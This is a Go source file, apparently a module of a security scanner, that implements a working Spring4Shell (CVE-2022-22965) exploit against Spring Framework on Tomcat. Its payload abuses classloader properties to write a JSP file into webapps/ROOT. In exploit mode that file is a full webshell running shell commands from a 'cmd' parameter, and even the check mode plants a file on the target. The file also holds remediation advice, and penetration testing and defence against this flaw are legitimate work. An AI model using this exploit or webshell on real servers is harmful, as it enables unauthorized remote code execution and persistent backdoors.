package cve

// CVE-2022-22965: Spring4Shell — Spring Framework RCE via ClassLoader
// Affects Spring Framework < 5.3.18 / < 5.2.20 on Tomcat with JDK 9+
// Attack: sets logging pattern via classloader to write a JSP webshell

import (
	"context"
	"fmt"
	"math/rand"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&Spring4Shell{}) }

type Spring4Shell struct{}

func (m *Spring4Shell) ID() string          { return "CVE-2022-22965" }
func (m *Spring4Shell) Name() string        { return "Spring4Shell RCE" }
func (m *Spring4Shell) CVSS() float64       { return 9.8 }
func (m *Spring4Shell) Severity() models.Severity { return models.SeverityCritical }
func (m *Spring4Shell) Tags() []string      { return []string{"rce", "spring-framework", "tomcat", "classloader"} }
func (m *Spring4Shell) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{MinConfidence: 20}
}
func (m *Spring4Shell) Description() string {
	return "Spring Framework RCE via classloader manipulation. Writes a JSP webshell to webapps/ROOT."
}

// Check sends the exploit payload and checks if a shell was created.
func (m *Spring4Shell) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	shellName := fmt.Sprintf("hawk_%d.jsp", rand.Intn(9999))
	if planted := m.tryPlantShell(ctx, target, client, shellName, false); planted {
		return []*models.Finding{m.buildFinding(target, shellName, false)}, nil
	}
	return nil, nil
}

func (m *Spring4Shell) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	shellName := fmt.Sprintf("hawk_%d.jsp", rand.Intn(9999))
	if planted := m.tryPlantShell(ctx, target, client, shellName, true); planted {
		return []*models.Finding{m.buildFinding(target, shellName, true)}, nil
	}
	return nil, nil
}

func (m *Spring4Shell) tryPlantShell(ctx context.Context, target *models.Target, client *httpclient.Client, shellName string, withShell bool) bool {
	// Step 1: Set classloader pattern to write a JSP shell
	shellPath := "webapps/ROOT/" + shellName
	var pattern string
	if withShell {
		// Full webshell: executes commands via cmd param
		pattern = `<%Runtime r=Runtime.getRuntime();String[] c=new String[]{"/bin/sh","-c",request.getParameter("cmd")};Process p=r.exec(c);java.io.DataInputStream in=new java.io.DataInputStream(p.getInputStream());String line;while((line=in.readLine())!=null){out.println(line);}%>`
	} else {
		pattern = `<%out.println("SpringHawk-Probe-OK");%>`
	}

	payload := fmt.Sprintf(
		"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%%25{prefix}i java.io.FileWriter%%20fw%%20%%3D%%20new%%20java.io.FileWriter(application.getRealPath(%%22/%s%%22))%%3B%%20fw.write(%%22%s%%22)%%3B%%20fw.close()%%3B%%20%%25{suffix}i&"+
			"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&"+
			"class.module.classLoader.resources.context.parent.pipeline.first.directory=%s&"+
			"class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&"+
			"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
		shellName, pattern, shellPath,
	)

	headers := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"prefix":       "<%",
		"suffix":       "%>//",
		"c":            "Runtime",
	}

	_, err := client.Post(ctx, target.BaseURL+"/", "application/x-www-form-urlencoded",
		strings.NewReader(payload), headers)
	if err != nil {
		return false
	}

	// Wait for Tomcat to write the file
	time.Sleep(300 * time.Millisecond)

	// Step 2: Verify shell exists
	checkURL := utils.JoinURL(target.BaseURL, shellName)
	resp, err := client.Get(ctx, checkURL, nil)
	if err != nil {
		return false
	}
	if withShell {
		return resp.StatusCode == 200 && !strings.Contains(resp.BodyString, "<title>")
	}
	return resp.StatusCode == 200 && strings.Contains(resp.BodyString, "SpringHawk-Probe-OK")
}

func (m *Spring4Shell) buildFinding(target *models.Target, shellName string, exploited bool) *models.Finding {
	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2022-22965"},
		Title:       "Spring4Shell: Remote Code Execution via ClassLoader",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/",
		Method:      "POST",
		Evidence:    fmt.Sprintf("JSP webshell planted at /%s — HTTP 200 returned.", shellName),
		Remediation: "Upgrade Spring Framework to 5.3.18+ or 5.2.20+. Restrict ClassLoader access. Do not use multipart form parsing on JDK 9+ without patching.",
		References:  []string{"https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement", "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
		IsExploited: exploited,
	}
	if exploited {
		f.ExtraData = map[string]string{
			"shell_url": utils.JoinURL(target.BaseURL, shellName),
			"shell_cmd": utils.JoinURL(target.BaseURL, shellName) + "?cmd=id",
		}
	}
	return f
}
